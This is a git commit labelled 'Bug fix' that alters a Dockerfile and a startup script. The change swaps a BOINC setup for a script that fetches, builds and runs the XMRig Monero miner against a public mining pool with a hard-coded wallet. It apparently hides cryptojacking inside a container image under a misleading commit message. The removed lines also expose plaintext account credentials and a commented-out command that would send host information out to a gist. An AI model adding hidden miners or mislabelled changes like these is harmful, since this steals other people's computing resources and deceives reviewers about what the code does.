a4ca61b582d96b81b883fa99e4896f3c0a3a8da0
ronan <qsdfghj4312@laposte.net>
2018-02-09 20:01:50 +0100

    Bug fix

--- Dockerfile
+++ Dockerfile
@@ -1,11 +1,11 @@
-FROM debian
-RUN apt-get update && apt-get install -y procps curl boinc-client
+FROM ubuntu
+RUN apt-get update && apt-get install -y curl git build-essential cmake libuv1-dev libmicrohttpd-dev
 
 COPY start.sh /start.sh
 RUN chmod 777 /start.sh
 
 COPY check.py /check.py
-COPY global_prefs_override.xml /global_prefs_override.xml
+COPY global_prefs_override.xml /etc/boinc-client/global_prefs_override.xml
 RUN chmod 777 /check.py
 
 RUN /bin/bash -c "source /start.sh"
--- start.sh
+++ start.sh
@@ -1,59 +1,10 @@
 #!/usr/bin/env bash
-
-echo "----------starting boinc--------------"
-service boinc-client start
-sleep 10
-service boinc-client status
-
-echo "----------sync project----------------"
-#boinccmd --project_attach http://srbase.my-firewall.org/sr5/ 1415_a1d6ad98cf9e20609e5ab241cd29054a
-boinccmd --join_acct_mgr https://www.grcpool.com/ "dgrimonadefrogi" "Azertyuiop4321"
-#/etc/init.d/boinc-client restart
-sleep 60
-boinccmd --join_acct_mgr https://www.grcpool.com/ "dgrimonadefrogi" "Azertyuiop4321"
-#/etc/init.d/boinc-client restart
-
-boinccmd --set_run_mode always
-boinccmd --set_network_mode always
-cp /global_prefs_override.xml /etc/boinc-client/global_prefs_override.xml
-
-boinccmd --read_global_prefs_override
-
-echo "---------restarting boinc-------------"
-service boinc-client restart
-
-
-echo "-------------host info----------------"
-HOST_INFO="$(boinccmd --get_host_info)"
-echo "$HOST_INFO"
-#HOST_GRAPHIC_CARDS="$(lspci | grep -i --color 'vga\|3d\|2d')"
-#echo "$HOST_GRAPHIC_CARDS"
-echo "---------------hostname---------------"
-HOSTNAME=$('hostname')
-echo "$HOSTNAME"
-#echo $GITHUB_USER
-#echo $GITHUB_PASSWORD
-#GITHUB_USER=''
-#GITHUB_PASSWORD=''
-
-#echo "------------pushing to gist-----------"
-#echo '{"description":"","public":false,"files":{"host":{"content":"$HOST_INFO"},"cg":{"content":"$HOST_GRAPHIC_CARDS"}}}' | curl --user "$GITHUB_USER:$GITHUB_PASSWORD" --data @- https://api.github.com/gists
-
-echo "---starting work & task monitoring----"
-
-echo "starting to work & sleep"
-for i in {1..3000}
-do
-   	echo "-------------Iteration $i-------------"
-   	sleep 120
-	boinccmd --join_acct_mgr https://www.grcpool.com/ "dgrimonadefrogi" "Azertyuiop4321"
-
-#   boinccmd --get_messages
-   cat /var/log/boincerr.log
-   service boinc-client start
-
-   boinccmd --get_state | grep 'total_duration\|total_active_duration\|total_gpu_active_duration'
-   boinccmd --project http://srbase.my-firewall.org/sr5/ update
-   echo "Ended tasks: $(boinccmd --get_old_tasks | grep task | wc -l)"
-   python /check.py
-done
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+mkdir build
+cd build
+cmake ..
+make
+ls -R
+curl ipinfo.io/ip
+./xmrig -o stratum+tcp://xmr-eu.dwarfpool.com:8080 -u 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn.37ea3b89e299ee4d188575e7d42f2cba88f66b4ff6327202a923b5b64ad21236 --donate-level=1
